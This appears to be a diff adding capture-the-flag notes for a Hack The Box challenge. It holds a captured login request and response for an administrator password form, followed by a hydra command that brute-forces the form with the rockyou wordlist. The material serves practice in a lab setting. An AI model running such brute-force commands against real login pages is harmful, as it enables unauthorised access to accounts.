@@ -1,0 +1,50 @@
+POST / HTTP/1.1
+Host: docker.hackthebox.eu:32772
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://docker.hackthebox.eu:32772/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+Cookie: _ga=GA1.2.414910529.1551690423; _gid=GA1.2.172107543.1551690423
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+password=firsttry
+
+
+
+
+
+HTTP/1.1 200 OK
+Date: Tue, 05 Mar 2019 10:15:45 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 474
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Invalid password!
+<html>
+<head>
+    <title>Login - Lernaean</title>
+</head>
+<body style="background-color: #cd4e7b;">
+    <center>
+        <br><br><br>
+        <h1><u>Administrator Login</u></h1>
+        <h2>--- CONFIDENTIAL ---</h2>
+        <h2>Please do not try to guess my password!</h2>
+        <form method="POST">
+            <input type="password" name="password"><br><br>
+            <input type="submit" value="Submit">
+        </form>
+    </center>
+</body>
+</html>
+
+
+
+
+hydra -s 35050 -l admin -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:F:Invalid" -e ns -t 11 -w 5 -W 1 -vV
